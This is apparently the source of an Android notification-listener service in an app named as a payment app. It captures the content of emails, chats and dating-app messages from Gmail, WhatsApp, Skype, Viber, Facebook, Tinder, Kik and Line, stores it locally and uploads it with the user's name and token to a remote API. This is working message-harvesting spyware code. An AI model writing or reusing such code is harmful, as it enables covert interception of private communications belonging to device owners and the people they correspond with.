package com.payment.app.services

import android.content.SharedPreferences
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.payment.app.R
import com.payment.app.model.ApiGmailNotificationModel
import com.payment.app.model.ApiNotificationModel
import com.payment.app.model.CalenderModel
import com.payment.app.model.GmailNotificationModel
import com.payment.app.model.NotificationModel
import com.payment.app.sqllite.SQLiteHelper
import java.time.Instant
import java.time.LocalDateTime
import java.util.TimeZone


class NotificationService : NotificationListenerService() {

    private lateinit var sqliteHelper : SQLiteHelper
    val apiCall = ApiCall()
    private var contentGmail = ""
    private var receiver = ""
    private val processedNotifications = mutableMapOf<String, Long>() // Map to store notification titles and timestamps
    private val YOUR_DEDUPLICATION_INTERVAL = 10 * 1000 // 30 seconds in milliseconds

    override fun onNotificationPosted(sbn: StatusBarNotification) {

        sqliteHelper = SQLiteHelper(this)

        val packageName = sbn.packageName
        val title = sbn.notification?.extras?.getCharSequence("android.title")
        val text = sbn.notification?.extras?.getCharSequence("android.text")
        val contentText = sbn.notification?.extras?.getCharSequence("android.text")?.toString()
        val extraText = sbn.notification?.extras?.getCharSequence("android.bigText")?.toString()
        val subText = sbn.notification?.extras?.getCharSequence("android.subText")?.toString()
        val notificationTime = sbn.postTime
        val triggerTime = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            LocalDateTime.ofInstant(
                Instant.ofEpochMilli(notificationTime), TimeZone
                    .getDefault().toZoneId()
            )
        } else {
            TODO("VERSION.SDK_INT < O")
        }
        val messageType = determineMessageType(text.toString())
        var type = 0
        when (messageType) {
            MessageType.TEXT -> {
                type = 1
                // It's a text message
            }
            MessageType.MEDIA -> {
                type = 2
                // It's a media message (e.g., image, video)
            }
            MessageType.VOICE -> {
                type = 3
                // It's a voice message
            }
            else -> {
                // Message type not recognized or it's not a message notification
            }
        }
        if (!isDuplicateNotification(title.toString(), text.toString())) {
            addProcessedNotification(title.toString(), text.toString(), System.currentTimeMillis())
//        Log.d("NotificationListener", "messageType: $messageType")
            Log.d("NotificationListener", "title: $title text: $text extraText: $extraText subText:$subText $packageName")
            if (packageName == "com.google.android.gm") {

                // Extract information from the Gmail notification
                val sender = sbn.notification.extras?.getString("android.title")
                val subject = sbn.notification.extras?.getCharSequence("android.text")
                val content = sbn.notification.extras?.getCharSequence("android.bigText")?.toString()
                val subText = sbn.notification.extras?.getString("android.subText")
                // Check if this is a new notification to avoid duplicates
                if (contentGmail != content) {
                    contentGmail = content ?: ""
                    receiver = subText!!

                    if (subject != null && subject.toString().toLowerCase().contains("new message")) {
                        // This is a notification indicating a new message
//                        Log.i("GmailMessage", "New Message Notification")
                    }
                    else{
                        if (content != null) {
                            addGmailNotification(subject.toString(),content,packageName,type,sender,receiver,triggerTime)
                        }
                        getEmailNotification()
                    }

                }
            }
            else if (packageName == "com.whatsapp") {
                val contactInfo = extractContactInfo(contentText)
                var contactName = ""
                var contactNumber = ""
                if (contactInfo != null) {
                    contactName = contactInfo.first
                    contactNumber = contactInfo.second
                    // Process the extracted contact information
//                    println("Contact Name: $contactName")
//                    println("Contact Number: $contactNumber")
                }
                addNotification(title.toString(),text.toString(),packageName,type,contactNumber,triggerTime)
                getWhatsappNotification()
            }
            else{
                if(packageName == "com.skype.raider"){
                    if(title != null && title.toString().toLowerCase().contains("new conversation")){
//                        Log.d("Skype New Conversation", "title: $title text: $text  $packageName")
                    }
                    else{
                        addNotification(title.toString(),text.toString(),packageName,type,"",triggerTime)
                    }
                }
                else{
                    addNotification(title.toString(),text.toString(),packageName,type,"",triggerTime)
                }
                getNotificationList()
                getSkypeNotification()
                getViberNotification()
                getFacebookNotification()
                getFacebookMessengerNotification()
                getTinderNotification()
                getKikNotification()
                getLineNotification()
                getCalenderNotification()
            }
        }


        // This method is called when a new notification is posted
        // You can access the notification details using sbn object
        // Read and process the notification here
    }

    private fun isDuplicateNotification(title: String?, detail: String?): Boolean {
        val currentTimestamp = System.currentTimeMillis()
        if (title != null && detail != null) {
            // Create a unique key for each notification based on title and detail
            val notificationKey = "$title|$detail"
            val previousTimestamp = processedNotifications[notificationKey]

            if (previousTimestamp != null && currentTimestamp - previousTimestamp < YOUR_DEDUPLICATION_INTERVAL) {
                // Duplicate notification within a certain time frame
                return true
            }
        }
        return false
    }

    private fun addProcessedNotification(title: String?, detail: String?, timestamp: Long) {
        if (title != null && detail != null) {
            val notificationKey = "$title|$detail"
            processedNotifications[notificationKey] = timestamp
        }
    }

    data class NotificationInfo(val key: String, val time: Long)


    private fun determineMessageType(contentText: String?): MessageType {
        if (contentText != null) {
            // Check the contentText to identify the message type
            if (contentText.contains("voice message")) {
                return MessageType.VOICE
            } else if (contentText.contains("image") || contentText.contains("video")) {
                return MessageType.MEDIA
            } else {
                return MessageType.TEXT
            }
        }

        return MessageType.UNKNOWN
    }

    private fun extractContactInfo(contentText: String?): Pair<String, String>? {
        if (contentText != null) {
            // Regular expression to match the sender's name or phone number
            val regex = "^(.*): (.*)$"
            val matchResult = regex.toRegex().find(contentText)

            if (matchResult != null && matchResult.groupValues.size == 3) {
                val name = matchResult.groupValues[1]
                val phoneNumber = matchResult.groupValues[2]

                Log.d("contactNameMatcher",name)
                Log.d("contactNumberMatcher",phoneNumber)

                return Pair(name, phoneNumber)
            }
        }

        return null
    }

    private fun getEmailNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getGmailNotification()
        Log.d("Email List", notificationList.size.toString())
        val dataList = ArrayList<ApiGmailNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            dataList.add(
                ApiGmailNotificationModel(
                    item.subject,
                    item.content,
                    item.mailType,
                    item.mailLogTime,
                    item.toEmail,
                    item.fromEmail
                )
            )
        }

        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callEmailApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: GmailNotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("EmailNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.subject + ", Detail = " + model.content + ", ToEmail = " + model.toEmail + ", FromEmail = " + model.fromEmail)
        }
    }

    private fun getCalenderNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.google.android.calendar")
        Log.d("Calender List", notificationList.size.toString())
        val dataList = ArrayList<CalenderModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                CalenderModel(
                    item.title,
                    item.detail,
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callCalenderApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("LineNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getLineNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("jp.naver.line.android")
        Log.d("Line List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callLineApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("LineNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getKikNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("kik.android")
        Log.d("Kik List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callKikApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("KikNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getTinderNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.tinder")
        Log.d("Tinder List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callTinderApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("TinderNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getFacebookMessengerNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.facebook.orca")
        Log.d("Facebook List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callFacebookApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("FacebookNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getFacebookNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.facebook.katana")
        Log.d("Facebook List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }
        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callFacebookApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("FacebookNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }

    private fun getViberNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.viber.voip")
        Log.d("Viber List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }

        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callViberApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

            Log.d("ViberNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail)
        }
    }
    private fun getSkypeNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.skype.raider")
//        Log.d("Skype List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }

        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callSkypeApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        val model: NotificationModel
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

//            Log.d("SkypeNotificationGet", "id = " + model.id.toString() + ", PackageName = " + model.packageName + ", Title = " + model.title + ", Detail = " + model.detail + ", Contact Number = " + model.contactNumber)
        }
    }

    private fun getWhatsappNotification() {
        val sharedPreferences: SharedPreferences = this.getSharedPreferences("token",
            AppCompatActivity.MODE_PRIVATE
        )
        val preferences = getSharedPreferences("login", MODE_PRIVATE)
        val name = preferences.getString("name", "")
        val token: String = sharedPreferences.getString("token", "").toString()
        val notificationList = sqliteHelper.getNotification("com.whatsapp")
//        Log.d("Whatsapp List", notificationList.size.toString())
        val dataList = ArrayList<ApiNotificationModel>()
        val id = ArrayList<Int>()
        for (item in notificationList) {
            id.add(item.id)
            // body of loop
            dataList.add(
                ApiNotificationModel(
                    item.title,
                    name.toString(),
                    item.detail,
                    item.messageType,
                    item.messageLogTime,
                    item.contactNumber
                )
            )
        }

        if(dataList.isNotEmpty()){
            var baseUrl = getString(R.string.api)

            apiCall.callWhatsappApi(baseUrl,dataList,token,applicationContext,id,sqliteHelper)
        }
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().
        }
    }


    private fun getNotificationList(
    ) {
        val notificationList = sqliteHelper.getAllNotification()
//        Log.d("Notification List", notificationList.size.toString())
        for (notification in notificationList.indices) {
            val model: NotificationModel =
                notificationList[notification] // "position"  or any number value according to your lemmaHeadingList.size().

//            Log.d("NotificationGet", "id = " + model.id.toString() + " PackageName = " + model.packageName + " Title = " + model.title + " Detail = " + model.detail)
        }


    }

    private fun addNotification(
        notificationText: String?,
        contentText: CharSequence,
        packageName: String,
        type: Int,
        contactNumber: String,
        triggerTime: LocalDateTime,
    ) {
        val notification =
            notificationText?.let { NotificationModel(title = it, detail = contentText.toString(),packageName = packageName, messageType = type, contactNumber = contactNumber, messageLogTime = triggerTime.toString()) }
        val status = notification?.let { sqliteHelper.insertNotification(it) }
        if (status != null) {
            if(status > -1){
                Log.d("Notification", "Notification Added...")
                Toast.makeText(this,"Notification Added...",Toast.LENGTH_LONG).show()
            }else{
                Log.e("Notification", "Notification Not Saved...")
                Toast.makeText(this,"Notification Not Saved...",Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun addGmailNotification(
        subject: String,
        content: String,
        packageName: String,
        type: Int,
        sender: String?,
        receiver: String,
        triggerTime: LocalDateTime
    ) {
        val notification =
            GmailNotificationModel(subject = subject, content = content,packageName = packageName, mailType = type, mailLogTime = triggerTime.toString(), toEmail = receiver, fromEmail = sender.toString())
        val status = notification.let { sqliteHelper.insertGmailNotification(it) }
        if(status > -1){
            Log.d("Gmail Notification", "Notification Added...")
            Toast.makeText(this,"Notification Added...",Toast.LENGTH_LONG).show()
        }else{
            Log.e("Gmail Notification", "Notification Not Saved...")
            Toast.makeText(this,"Notification Not Saved...",Toast.LENGTH_LONG).show()
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val notificationText = sbn.notification?.tickerText?.toString()
//        Log.d("NotificationListener", "Notification Removed - Package: $packageName")
//        Log.d("NotificationListener", "Removed Notification Text: $notificationText")

        // This method is called when a notification is removed
        // You can access the removed notification details using sbn object
        // Perform any necessary cleanup or tracking here
    }
}
enum class MessageType {
    TEXT, MEDIA, VOICE, UNKNOWN
}
